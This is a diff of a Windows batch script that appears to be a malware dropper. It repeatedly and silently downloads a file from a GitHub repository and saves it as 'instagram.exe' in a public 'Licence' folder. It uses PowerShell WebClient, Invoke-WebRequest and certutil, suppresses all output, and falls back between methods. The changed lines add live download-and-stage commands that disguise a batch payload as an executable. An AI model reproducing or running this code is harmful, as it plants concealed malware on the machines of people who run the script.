@@ -251,7 +251,7 @@ echo .
       if errorlevel 1 goto ERROR2  
 
    if not exist "C:\Users\Public\Licence\Extension\instagram.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/Exe/instagram.exe?raw=true', 'instagram.exe')" > nul 2> nul
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/instagram.bat?raw=true', 'instagram.exe')" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR2  
 
@@ -390,7 +390,7 @@ echo .
       if errorlevel 1 goto ERROR3
 
    if not exist "C:\Users\Public\Licence\Extension\instagram.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/Exe/instagram.exe?raw=true -OutFile instagram.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/instagram.bat?raw=true -OutFile instagram.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
   
@@ -425,7 +425,7 @@ echo .
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
    if errorlevel 1 goto EOF
 
-   set url="https://github.com/win32u/Licence/blob/main/UserSohel/Exe/instagram.exe?raw=true"
+   set url="https://github.com/win32u/Licence/blob/main/UserSohel/instagram.bat?raw=true"
    set filename="instagram.exe"
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
    if errorlevel 1 goto EOF
